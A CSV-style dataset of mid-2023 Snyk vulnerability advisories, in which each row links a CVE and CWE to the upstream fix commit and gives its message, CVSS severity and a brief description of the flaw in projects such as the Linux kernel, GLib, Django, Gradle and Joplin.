CVE-2023-36183,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-OPENIMAGEIOOIIO-5753030,04/07/2023,04/07/2023,https://github.com/OpenImageIO/oiio/commit/749a557b5eed75a1b1c728e6287e4ca8e2e0be1e,Arbitrary Code Execution,https://api.github.com/repos/OpenImageIO/oiio/commits/749a557b5eed75a1b1c728e6287e4ca8e2e0be1e,xiaoxiaoafeifei,zhailiangliang@loongson.cn,oiio,749a557b5eed75a1b1c728e6287e4ca8e2e0be1e,"fix(ico): heap-buffer-overflow (#3872)

heap-buffer-overflow in function ICOInput::readimg 

fixes #3871",C/C++,9.8,critical,Affected versions of this package are vulnerable to Arbitrary Code Execution due to a heap-based buffer overflow in the ICOInput::readimg() function in icoinput.cpp.,2023
CVE-2023-2162,CWE-416,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5752459,04/07/2023,17/01/2023,https://github.com/torvalds/linux/commit/f484a794e4ee2a9ce61f52a78e810ac45f3fe3b3,Information Exposure,https://api.github.com/repos/torvalds/linux/commits/f484a794e4ee2a9ce61f52a78e810ac45f3fe3b3,Mike Christie,michael.christie@oracle.com,linux,f484a794e4ee2a9ce61f52a78e810ac45f3fe3b3,"scsi: iscsi_tcp: Fix UAF during login when accessing the shost ipaddress

If during iscsi_sw_tcp_session_create() iscsi_tcp_r2tpool_alloc() fails,
userspace could be accessing the host's ipaddress attr. If we then free the
session via iscsi_session_teardown() while userspace is still accessing the
session we will hit a use after free bug.

Set the tcp_sw_host->session after we have completed session creation and
can no longer fail.

Link: https://lore.kernel.org/r/20230117193937.21244-3-michael.christie@oracle.com
Signed-off-by: Mike Christie <michael.christie@oracle.com>
Reviewed-by: Lee Duncan <lduncan@suse.com>
Acked-by: Ding Hui <dinghui@sangfor.com.cn>
Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>",C/C++,6.6,medium,"Affected versions of this package are vulnerable to Information Exposure in the iscsi_sw_tcp_session_create() function in drivers/scsi/iscsi_tcp.c in the SCSI component, due to a use-after-free flaw. An attacker can exploit this to leak kernel memory.",2023
CVE-2023-32611,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GLIB-5752458,04/07/2023,14/12/2022,https://github.com/GNOME/glib/commit/7d7efce1d9c379fdd7d2ff58caea88f8806fdd2e,Denial of Service (DoS),https://api.github.com/repos/GNOME/glib/commits/7d7efce1d9c379fdd7d2ff58caea88f8806fdd2e,Philip Withnall,pwithnall@endlessos.org,glib,7d7efce1d9c379fdd7d2ff58caea88f8806fdd2e,"gvariant: Allow g_variant_byteswap() to operate on tree-form variants

This avoids needing to always serialise a variant before byteswapping it.
With variants in non-normal forms, serialisation can result in a large
increase in size of the variant, and a lot of allocations for leaf
`GVariant`s. This can lead to a denial of service attack.

Avoid that by changing byteswapping so that it happens on the tree form
of the variant if the input is in non-normal form. If the input is in
normal form (either serialised or in tree form), continue using the
existing code as byteswapping an already-serialised normal variant is
about 3× faster than byteswapping on the equivalent tree form.

The existing unit tests cover byteswapping well, but need some
adaptation so that they operate on tree form variants too.

I considered dropping the serialised byteswapping code and doing all
byteswapping on tree-form variants, as that would make maintenance
simpler (avoiding having two parallel implementations of byteswapping).
However, most inputs to `g_variant_byteswap()` are likely to be
serialised variants (coming from a byte array of input from some foreign
source) and most of them are going to be in normal form (as corruption
and malicious action are rare). So getting rid of the serialised
byteswapping code would impose quite a performance penalty on the common
case.

Signed-off-by: Philip Withnall <pwithnall@endlessos.org>

Fixes: #2797",C/C++,5.5,medium,"Affected versions of this package are vulnerable to Denial of Service (DoS) in the g_variant_byteswap() function in gvariant.c, when deserializing non-normal GVariant inputs.",2023
CVE-2023-32665,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GLIB-5752415,04/07/2023,14/12/2022,https://github.com/GNOME/glib/commit/ade71fb544391b2e33e1859645726bfee0d5eaaf,Denial of Service (DoS),https://api.github.com/repos/GNOME/glib/commits/ade71fb544391b2e33e1859645726bfee0d5eaaf,William Manley,will@stb-tester.com,glib,ade71fb544391b2e33e1859645726bfee0d5eaaf,"gvariant: Don’t allow child elements to overlap with each other

If different elements of a variable sized array can overlap with each
other then we can cause a `GVariant` to normalise to a much larger type.

This commit changes the behaviour of `GVariant` with non-normal form data. If
an invalid frame offset is found all subsequent elements are given their
default value.

When retrieving an element at index `n` we scan the frame offsets up to index
`n` and if they are not in order we return an element with the default value
for that type.  This guarantees that elements don't overlap with each
other.  We remember the offset we've scanned up to so we don't need to
repeat this work on subsequent accesses.  We skip these checks for trusted
data.

Unfortunately this makes random access of untrusted data O(n) — at least
on first access.  It doesn't affect the algorithmic complexity of accessing
elements in order, such as when using the `GVariantIter` interface.  Also:
the cost of validation will be amortised as the `GVariant` instance is
continued to be used.

I've implemented this with 4 different functions, 1 for each element size,
rather than looping calling `gvs_read_unaligned_le` in the hope that the
compiler will find it easy to optimise and should produce fairly tight
code.

Fixes: #2121",C/C++,5.5,medium,Affected versions of this package are vulnerable to Denial of Service (DoS) when deserializing non-normal GVariant data. An attacker can cause the consumption of excessive resources by passing in a GVariant with elements whose array bounds are overlapping.,2023
CVE-2023-35935,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JS-FASTIFYOAUTH2-5752413,04/07/2023,04/07/2023,https://github.com/fastify/fastify-oauth2/commit/bff756b456cbb769080631af2beb85671ff4c79c,Cross-site Request Forgery (CSRF),https://api.github.com/repos/fastify/fastify-oauth2/commits/bff756b456cbb769080631af2beb85671ff4c79c,Marco Ippolito,marcoippolito54@gmail.com,fastify-oauth2,bff756b456cbb769080631af2beb85671ff4c79c,"Merge pull request from GHSA-g8x5-p9qc-cf95

* feat: pass request into checkStateFunction

* feat: add state in cookies

* fix: check presence

* fix: check cookie only

* fix: change defaultGenerateStateFunction

* Update index.js

Co-authored-by: Filip Skokan <panva.ip@gmail.com>

* fix: unsign

* fix: assume stateCookie is always present

* renamed state

* fix: use session

---------

Co-authored-by: Filip Skokan <panva.ip@gmail.com>",Markdown,7.4,high,"@fastify/oauth2 is a Perform login using oauth2 protocol
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) due to mishandling the state parameter, which is not kept unique among users. 
NOTE: The fix for this vulnerability contains a breaking change in the checkStateFunction function, which now accepts the full Request object.
NOTE: This vulnerability is also referred to by CVE-2023-31999.",2023
CVE-2023-34451,CWE-401,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCOMETBFTCOMETBFTMEMPOOLV0-5752412,04/07/2023,04/07/2023,https://github.com/cometbft/cometbft/commit/587522f5df2dba7acb3ecc0eff0b0e972613bda2,Denial of Service (DoS),https://api.github.com/repos/cometbft/cometbft/commits/587522f5df2dba7acb3ecc0eff0b0e972613bda2,mergify[bot],37929162+mergify[bot]@users.noreply.github.com,cometbft,587522f5df2dba7acb3ecc0eff0b0e972613bda2,"v0.37.x: Prevent a transaction to appear twice in the mempool (backport #890) (#926)

* add a test to trigger the issue
* add a fix (in particular, we track the sender when receiving a tx twice)
* add a changelog

---------

Co-authored-by: Daniel <daniel.cason@informal.systems>
(cherry picked from commit a09f5d33ecd8846369b93cae9063291eb8abc3a0)

* update fix and test wrt. v0.37.x

---------

Co-authored-by: Pierre Sutra <0track@gmail.com>",Markdown,7.5,high,"github.com/cometbft/cometbft/mempool/v0 is a Byzantine Fault Tolerant (BFT) middleware that takes a state transition machine - written in any programming language - and securely replicates it on many machines.
Affected versions of this package are vulnerable to Denial of Service (DoS). The mempool maintains two data structures to keep track of outstanding transactions: a list and a map. When these structures get out of sync, the list may contain several copies of the same transaction. Because the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list. This happens even if the duplicated transaction is later committed in a block. The only way to remove the transaction is by restarting the node. This can be exploited to bring down the target node.",2023
CVE-2023-34450,CWE-401,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCOMETBFTCOMETBFTCONSENSUS-5752410,04/07/2023,04/07/2023,https://github.com/cometbft/cometbft/commit/f6ea09171a2bf9f695f59b65f5c51e4a8c168015,Denial of Service (DoS),https://api.github.com/repos/cometbft/cometbft/commits/f6ea09171a2bf9f695f59b65f5c51e4a8c168015,mmsqe,mavis@crypto.com,cometbft,f6ea09171a2bf9f695f59b65f5c51e4a8c168015,"fix: avoid recursive call after rename to (*PeerState).MarshalJSON (#865)

* avoid recursive call after rename to (*PeerState).MarshalJSON

* add test

* add change doc

* explain for nolint

* fix lint

* fix golangci-lint to v1.52.2

* fix golangci-lint to v1.52.2

* Revert ""fix golangci-lint to v1.52.2""

This reverts commit 598a9ef4c86fc29cf038251676c33a222217826c.

* Revert ""fix golangci-lint to v1.52.2""

This reverts commit a8aad121e27382813e95b1911b1b560c62e1c7c3.

* Reintroduced `cmtjson`

* Avoid copying Mutex

* Avoid copying Mutex -- 2nd try, more succint

* Update .changelog/unreleased/bug-fixes/865-fix-peerstate-marshaljson.md

* Update consensus/reactor_test.go

---------

Co-authored-by: Sergio Mena <sergio@informal.systems>",Markdown,3.7,low,"github.com/cometbft/cometbft/consensus is a Byzantine Fault Tolerant (BFT) middleware that takes a state transition machine - written in any programming language - and securely replicates it on many machines.
Affected versions of this package are vulnerable to Denial of Service (DoS) due to the way the struct PeerState is serialized to JSON. An attacker can trigger a deadlock in the MarshallJSON function via logs or RPC. If the consensus logging module is set to ""debug"" level (should not happen in production), and the log output format in use is JSON, the attacker can bring down the node. 
Using the dump_consensus_state RPC, the attacker can cause one communication channel to the target node to be blocked. The theoretical worst case for this attack vector is a network with only two validator nodes. In this case, each of the nodes only has one PeerState struct. If dump_consensus_state is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different PeerState structs) and the chain will progress again. Then, the same process can be repeated. As the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with two nodes decreases. Only the first PeerState struct will deadlock, and not the others (RPC dump_consensus_state accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that ""for"" loop to never be reached).",2023
CVE-2023-36814,CWE-770,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PRODUCTSCMFCORE-5752411,04/07/2023,04/07/2023,https://github.com/zopefoundation/Products.CMFCore/commit/40f03f43a60f28ca9485c8ef429efef729be54e5,Denial of Service (DoS),https://api.github.com/repos/zopefoundation/Products.CMFCore/commits/40f03f43a60f28ca9485c8ef429efef729be54e5,Jens Vagelpohl,jens@plyp.com,Products.CMFCore,40f03f43a60f28ca9485c8ef429efef729be54e5,"Merge pull request from GHSA-4hpj-8rhv-9x87

Improve handling of PortalFolder filter input.",Unknown,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) in the encodeFolderFilter() function in PortalFolder.py. The marshal module used on PortalFolder objects can cause a crash when supplied with very large inputs.,2023
CVE-2023-35797,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-APACHEAIRFLOWPROVIDERSAPACHEHIVE-5750791,03/07/2023,03/07/2023,https://github.com/apache/airflow/commit/6724eeb6210d5965937eaf9dae3e476eb30f8268,Remote Code Execution (RCE),https://api.github.com/repos/apache/airflow/commits/6724eeb6210d5965937eaf9dae3e476eb30f8268,Jarek Potiuk,jarek@potiuk.com,airflow,6724eeb6210d5965937eaf9dae3e476eb30f8268,"Sanitize beeline principal parameter (#31983)

Similar to other parameters of Beeline, principal should not
contain the semicolon.",Python,8.8,high,Affected versions of this package are vulnerable to Remote Code Execution (RCE) by bypassing the security check on the beeline principal parameter passed to the _prepare_cli_cmd() function. Attackers with permission to modify the connection details can trigger code execution.,2023
CVE-2023-2861,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-QEMUPROJECTQEMU-5750792,03/07/2023,07/06/2023,https://github.com/qemu/qemu/commit/f6b0de53fb87ddefed348a39284c8e2f28dc4eda,Access Restriction Bypass,https://api.github.com/repos/qemu/qemu/commits/f6b0de53fb87ddefed348a39284c8e2f28dc4eda,Christian Schoenebeck,qemu_oss@crudebyte.com,qemu,f6b0de53fb87ddefed348a39284c8e2f28dc4eda,"9pfs: prevent opening special files (CVE-2023-2861)

The 9p protocol does not specifically define how server shall behave when
client tries to open a special file, however from security POV it does
make sense for 9p server to prohibit opening any special file on host side
in general. A sane Linux 9p client for instance would never attempt to
open a special file on host side, it would always handle those exclusively
on its guest side. A malicious client however could potentially escape
from the exported 9p tree by creating and opening a device file on host
side.

With QEMU this could only be exploited in the following unsafe setups:

  - Running QEMU binary as root AND 9p 'local' fs driver AND 'passthrough'
    security model.

or

  - Using 9p 'proxy' fs driver (which is running its helper daemon as
    root).

These setups were already discouraged for safety reasons before,
however for obvious reasons we are now tightening behaviour on this.

Fixes: CVE-2023-2861
Reported-by: Yanwu Shen <ywsPlz@gmail.com>
Reported-by: Jietao Xiao <shawtao1125@gmail.com>
Reported-by: Jinku Li <jkli@xidian.edu.cn>
Reported-by: Wenbo Shen <shenwenbo@zju.edu.cn>
Signed-off-by: Christian Schoenebeck <qemu_oss@crudebyte.com>
Reviewed-by: Greg Kurz <groug@kaod.org>
Reviewed-by: Michael Tokarev <mjt@tls.msk.ru>
Message-Id: <E1q6w7r-0000Q0-NM@lizzy.crudebyte.com>",C/C++,6.0,medium,"Affected versions of this package are vulnerable to Access Restriction Bypass when a malicious client attempts to create and open a device file on the host side. This is only exploitable in specific setups where the QEMU binary is run as root with the 9p 'local' fs driver and 'passthrough' security model, or when using the 9p 'proxy' fs driver with its helper daemon running as root. An attacker can potentially escape from the exported 9p tree. 
NOTE: These setups are documented as discouraged by the developers, for safety reasons.",2023
CVE-2023-36053,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DJANGO-5750790,03/07/2023,03/07/2023,https://github.com/django/django/commit/454f2fb93437f98917283336201b4048293f7582,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/django/django/commits/454f2fb93437f98917283336201b4048293f7582,Mariusz Felisiak,felisiak.mariusz@gmail.com,django,454f2fb93437f98917283336201b4048293f7582,"[3.2.x] Fixed CVE-2023-36053 -- Prevented potential ReDoS in EmailValidator and URLValidator.

Thanks Seokchan Yoon for reports.",Python,7.5,high,"Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the EmailValidator and URLValidator classes, when processing a very large number of domain name labels on emails or URLs.",2023
CVE-2023-2961,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-AMADVANCEADVANCECOMP-5750788,03/07/2023,18/01/2023,https://github.com/amadvance/advancecomp/commit/cfca0f6e589cd46151d067c6723752ff17038b2a,Denial of Service (DoS),https://api.github.com/repos/amadvance/advancecomp/commits/cfca0f6e589cd46151d067c6723752ff17038b2a,Andrea Mazzoleni,amadvance@gmail.com,advancecomp,cfca0f6e589cd46151d067c6723752ff17038b2a,Check for overflow in PNG/MNG size,C/C++,3.3,low,Affected versions of this package are vulnerable to Denial of Service (DoS) due to a segmentation fault when processing PNG/MNG files.,2023
CVE-2023-0458,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5750787,03/07/2023,21/01/2023,https://github.com/torvalds/linux/commit/739790605705ddcf18f21782b9c99ad7d53a8c11,Information Exposure,https://api.github.com/repos/torvalds/linux/commits/739790605705ddcf18f21782b9c99ad7d53a8c11,Greg Kroah-Hartman,gregkh@linuxfoundation.org,linux,739790605705ddcf18f21782b9c99ad7d53a8c11,"prlimit: do_prlimit needs to have a speculation check

do_prlimit() adds the user-controlled resource value to a pointer that
will subsequently be dereferenced.  In order to help prevent this
codepath from being used as a spectre ""gadget"" a barrier needs to be
added after checking the range.

Reported-by: Jordy Zomer <jordyzomer@google.com>
Tested-by: Jordy Zomer <jordyzomer@google.com>
Suggested-by: Linus Torvalds <torvalds@linuxfoundation.org>
Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",C/C++,4.7,medium,Affected versions of this package are vulnerable to Information Exposure via speculative pointer dereference (Spectre) in the do_prlimit() function in kernel/sys.c. The resource argument value is controlled and used in pointer arithmetic for the 'rlim' variable and can be used to leak the contents.,2023
CVE-2023-35947,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGGRADLE-5750785,03/07/2023,03/07/2023,https://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/gradle/gradle/commits/1096b309520a8c315e3b6109a6526de4eabcb879,Louis Jacomet,louis@jacomet.dev,gradle,1096b309520a8c315e3b6109a6526de4eabcb879,"Merge pull request from GHSA-84mw-qh6q-v842

Refactor AbstractArchiveFileTreeElement to use ZipSlip by default",Java,6.9,medium,"Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) that allows files to be written into an unintended location outside the provided Tar unpack location. It also allows reading files outside the intended Tar archive location. An attacker in control of an archive already used by the build or the relevant build configuration can exploit this. It is unlikely that this would go unnoticed. This Zip Slip variant may also be called ""Tar Slip"".",2023
CVE-2023-3428,CWE-122,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-IMAGEMAGICKIMAGEMAGICK-5750786,03/07/2023,27/06/2023,https://github.com/ImageMagick/ImageMagick/commit/a531d28e31309676ce8168c3b6dbbb5374b78790,Heap-based Buffer Overflow,https://api.github.com/repos/ImageMagick/ImageMagick/commits/a531d28e31309676ce8168c3b6dbbb5374b78790,Cristy,urban-warrior@imagemagick.org,ImageMagick,a531d28e31309676ce8168c3b6dbbb5374b78790,"heap-buffer-overflow in ImageMagick <= 7.1.1-12, contributed by Hardik shah of Vehere (Dawn Treaders team)",C/C++,5.5,medium,Affected versions of this package are vulnerable to Heap-based Buffer Overflow in the ReadTIFFImage() function in coders/tiff.c.,2023
CVE-2023-35946,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGGRADLE-5750784,03/07/2023,03/07/2023,https://github.com/gradle/gradle/commit/859eae2b2acf751ae7db3c9ffefe275aa5da0d5d,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/gradle/gradle/commits/859eae2b2acf751ae7db3c9ffefe275aa5da0d5d,Louis Jacomet,louis@gradle.com,gradle,859eae2b2acf751ae7db3c9ffefe275aa5da0d5d,"Fix dependency cache path traversal vulnerability

Gradle leverages the protection added to prevent ZipSlip for any path
computation inside a Gradle cache.

See https://github.com/gradle/gradle/security/advisories/GHSA-2h6c-rv6q-494v",Java,6.9,medium,Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) that allows files to be written into an unintended location - outside the dependency cache or replacing another file in the dependency cache. An attacker in control of a dependency repository or the relevant build configuration can poison the dependency cache or overwrite important files elsewhere on the filesystem. It is unlikely that this would go unnoticed.,2023
CVE-2023-36807,CWE-835,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PYPDF2-5750299,02/07/2023,01/07/2023,https://github.com/py-pdf/pypdf/commit/e6531a25325e7e0174b6a1ba03b57320b5227f6b,Infinite loop,https://api.github.com/repos/py-pdf/pypdf/commits/e6531a25325e7e0174b6a1ba03b57320b5227f6b,pubpub-zz,4083478+pubpub-zz@users.noreply.github.com,pypdf,e6531a25325e7e0174b6a1ba03b57320b5227f6b,"ROB: Fix infinite loop due to Invalid object (#1331)

Fixes #1329

* Prevent loop within dictionaries caused by objects not respecting the PDF standard
* Fix cmap warnings due to ""numbered"" characters ( #2d instead of -)
* Apply unnumbering to NameObject
* Add _get_indirect_object for debugging and development
* Add some missing seeks (no issue reported yet)",Python,6.2,medium,"PyPDF2 is an A pure-python PDF library capable of splitting, merging, cropping, and transforming PDF files
Affected versions of this package are vulnerable to Infinite loop when reading malformed objects.
Exploiting this vulnerability is possible by sending a  crafted PDF and results in blocking the current process and can utilize a single core of the CPU by 100%.",2023
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-RUST-S2NQUIC-5750298,02/07/2023,01/07/2023,https://github.com/aws/s2n-quic/commit/4b1d417e9de7eafaf5350553c5fcb9264dfa32f5,Denial of Service (DoS),https://api.github.com/repos/aws/s2n-quic/commits/4b1d417e9de7eafaf5350553c5fcb9264dfa32f5,Cameron Bytheway,bytheway.cameron@gmail.com,s2n-quic,4b1d417e9de7eafaf5350553c5fcb9264dfa32f5,Merge pull request from GHSA-hxq4-mx37-fqvg,Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS) when receiving empty UDP packets on a connection.
Exploiting this vulnerability results in the endpoint shutting down.
Note:
No AWS services are affected by this issue and customers of AWS services do not need to take action.",2023
CVE-2023-36812,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-NETOPENTSDB-5750297,02/07/2023,01/07/2023,https://github.com/OpenTSDB/opentsdb/commit/07c4641471c6f5c2ab5aab615969e97211eb50d9,Arbitrary Code Execution,https://api.github.com/repos/OpenTSDB/opentsdb/commits/07c4641471c6f5c2ab5aab615969e97211eb50d9,Chris Larsen,clarsen@netflix.com,opentsdb,07c4641471c6f5c2ab5aab615969e97211eb50d9,"Improved fix for #2261.
Regular expressions wouldn't catch the newlines or possibly other
control characters. Now we'll use the TAG validation code to make
sure the inputs are only plain ASCII printables first.
Fixes CVE-2018-12972, CVE-2020-35476",Java,8.8,high,"net.opentsdb:opentsdb is a scalable, distributed Time Series Database.
Affected versions of this package are vulnerable to Arbitrary Code Execution by writing user-controlled input to the Gnuplot configuration file and running Gnuplot with the generated configuration.",2023
CVE-2023-37302,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MEDIAWIKICORE-5750295,02/07/2023,01/07/2023,https://github.com/wikimedia/mediawiki-extensions-Wikibase/commit/2b5cbf7458422f922aaa7c85c56096224163a6ec,Cross-site Scripting (XSS),https://api.github.com/repos/wikimedia/mediawiki-extensions-Wikibase/commits/2b5cbf7458422f922aaa7c85c56096224163a6ec,Lucas Werkmeister,lucas.werkmeister@wikimedia.de,mediawiki-extensions-Wikibase,2b5cbf7458422f922aaa7c85c56096224163a6ec,"SECURITY: Escape badge title

For the badge title= attribute, we use the plain text item label, but
weren’t escaping it previously. Fix that and add a test.

Bug: T339111
Change-Id: I535a7577df9882cf199407a68dc768febe076eaa",PHP,6.1,medium,"mediawiki/core is a Free software wiki application developed by the Wikimedia Foundation and others.
Note: This package is not maintained on Packagist anymore, but newer releases exist.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) in SiteLinksView.php of Wikibase via a crafted badge title attribute.",2023
CVE-2023-37298,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-JOPLIN-5750294,02/07/2023,30/06/2023,https://github.com/laurent22/joplin/commit/caf66068bfc474bbfd505013076ed173cd90ca83,Cross-site Scripting (XSS),https://api.github.com/repos/laurent22/joplin/commits/caf66068bfc474bbfd505013076ed173cd90ca83,Laurent Cozic,laurent22@users.noreply.github.com,joplin,caf66068bfc474bbfd505013076ed173cd90ca83,"Desktop, Mobile: Security: Disable SVG tag support in editor to prevent XSS",TypeScript,6.1,medium,"joplin is a note taking and to-do application.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization passed via a USE element in an SVG document.",2023
CVE-2023-33190,CWE-287,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMLABRINGSEALOSCONTROLLERSUSER-5750290,02/07/2023,01/07/2023,https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b,Improper Authentication,https://api.github.com/repos/labring/sealos/commits/4cdf52e55666864e5f90ed502e9fc13e18985b7b,cuisongliu,cuisongliu@qq.com,sealos,4cdf52e55666864e5f90ed502e9fc13e18985b7b,"Merge pull request from GHSA-74j8-w7f9-pp62

* fix(main): add namespace controller

Signed-off-by: cuisongliu <cuisongliu@qq.com>

* fix(main): add namespace controller

Signed-off-by: cuisongliu <cuisongliu@qq.com>

---------

Signed-off-by: cuisongliu <cuisongliu@qq.com>",Go,9.9,critical,"Affected versions of this package are vulnerable to Improper Authentication due to improper configuration of RBAC permissions, which allows obtaining cluster control permissions.
Exploiting this vulnerability allows controlling the entire cluster deployed with Sealos and hundreds of pods and other resources within the cluster.",2023
CVE-2023-33190,CWE-287,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMLABRINGSEALOSCONTROLLERSUSERCONTROLLERS-5750291,02/07/2023,01/07/2023,https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b,Improper Authentication,https://api.github.com/repos/labring/sealos/commits/4cdf52e55666864e5f90ed502e9fc13e18985b7b,cuisongliu,cuisongliu@qq.com,sealos,4cdf52e55666864e5f90ed502e9fc13e18985b7b,"Merge pull request from GHSA-74j8-w7f9-pp62

* fix(main): add namespace controller

Signed-off-by: cuisongliu <cuisongliu@qq.com>

* fix(main): add namespace controller

Signed-off-by: cuisongliu <cuisongliu@qq.com>

---------

Signed-off-by: cuisongliu <cuisongliu@qq.com>",Go,9.9,critical,"Affected versions of this package are vulnerable to Improper Authentication due to improper configuration of RBAC permissions, which allows obtaining cluster control permissions.
Exploiting this vulnerability allows controlling the entire cluster deployed with Sealos and hundreds of pods and other resources within the cluster.",2023
CVE-2022-2062,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-NOCODB-5750285,02/07/2023,14/06/2022,https://github.com/nocodb/nocodb/commit/a18f5dd53811b9ec1c1bb2fdbfb328c0c87d7fb4,Information Exposure,https://api.github.com/repos/nocodb/nocodb/commits/a18f5dd53811b9ec1c1bb2fdbfb328c0c87d7fb4,navi,oof1lab@gmail.com,nocodb,a18f5dd53811b9ec1c1bb2fdbfb328c0c87d7fb4,"Merge pull request #2342 from nocodb/fix/smtp-test

Fix: Exclude sensitive data related to server from SMTP test api",TypeScript,5.3,medium,"nocodb is a NocoDB
Affected versions of this package are vulnerable to Information Exposure due to missing verification in the SMTP plugin. Exploiting this vulnerability allows attackers to make requests to internal servers and read the contents.",2023
CVE-2023-3485,CWE-1188,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GOTEMPORALIOSERVERSERVICEFRONTEND-5750289,02/07/2023,01/07/2023,https://github.com/temporalio/temporal/commit/ef982348f16d1cd0065d251068ff6bd37f2e7f8d,Insecure Default Initialization of Resource,https://api.github.com/repos/temporalio/temporal/commits/ef982348f16d1cd0065d251068ff6bd37f2e7f8d,David Reiss,david@temporal.io,temporal,ef982348f16d1cd0065d251068ff6bd37f2e7f8d,Turn on frontend.enableTokenNamespaceEnforcement by default (#3798),Go,3.0,low,"Affected versions of this package are vulnerable to Insecure Default Initialization of Resource allowing an attacker to craft a task token with access to a namespace other than the one specified in the request. This task token must be created outside of the normal Temporal server flow. It requires the namespace UUID and information from the workflow history for the target namespace. Under these conditions, it is possible to interfere with pending tasks in other namespaces, such as marking a task as failed or completed.
If a task is targeted for completion by the attacker, the targeted namespace must also use the same data converter configuration as the initial, valid namespace for the task completion payload to be decoded by workers in the target namespace.",2023
CVE-2023-3485,CWE-1188,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMTEMPORALIOTEMPORALSERVICEFRONTEND-5750288,02/07/2023,01/07/2023,https://github.com/temporalio/temporal/commit/ef982348f16d1cd0065d251068ff6bd37f2e7f8d,Insecure Default Initialization of Resource,https://api.github.com/repos/temporalio/temporal/commits/ef982348f16d1cd0065d251068ff6bd37f2e7f8d,David Reiss,david@temporal.io,temporal,ef982348f16d1cd0065d251068ff6bd37f2e7f8d,Turn on frontend.enableTokenNamespaceEnforcement by default (#3798),Go,3.0,low,"Affected versions of this package are vulnerable to Insecure Default Initialization of Resource allowing an attacker to craft a task token with access to a namespace other than the one specified in the request. This task token must be created outside of the normal Temporal server flow. It requires the namespace UUID and information from the workflow history for the target namespace. Under these conditions, it is possible to interfere with pending tasks in other namespaces, such as marking a task as failed or completed.
If a task is targeted for completion by the attacker, the targeted namespace must also use the same data converter configuration as the initial, valid namespace for the task completion payload to be decoded by workers in the target namespace.",2023
CVE-2023-37299,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-JOPLIN-5750286,02/07/2023,30/06/2023,https://github.com/laurent22/joplin/commit/9e90d9016daf79b5414646a93fd369aedb035071,Cross-site Scripting (XSS),https://api.github.com/repos/laurent22/joplin/commits/9e90d9016daf79b5414646a93fd369aedb035071,Laurent Cozic,laurent22@users.noreply.github.com,joplin,9e90d9016daf79b5414646a93fd369aedb035071,All: Security: Prevent XSS by sanitizing certain HTML attributes,HTML,6.1,medium,"joplin is a note taking and to-do application.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization. Exploiting this vulnerability is possible via an AREA element of an image map.",2023
CVE-2023-31543,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PIPREQS-5750287,02/07/2023,01/07/2023,https://github.com/bndr/pipreqs/commit/3f5964fcb90ec6eb6df46d78e651a1b73538d0ba,Arbitrary Code Execution,https://api.github.com/repos/bndr/pipreqs/commits/3f5964fcb90ec6eb6df46d78e651a1b73538d0ba,adeadfed,maksym.vatsyk17@gmail.com,pipreqs,3f5964fcb90ec6eb6df46d78e651a1b73538d0ba,fix name resolution for local packages,Python,8.3,high,"pipreqs is a Pip requirements.txt generator based on imports in project
Affected versions of this package are vulnerable to Arbitrary Code Execution due to a possible dependency confusion via uploading a crafted PyPI package to the chosen repository server.
Note:
In order to successfully conduct an attack these prerequisites have to be met.",2023
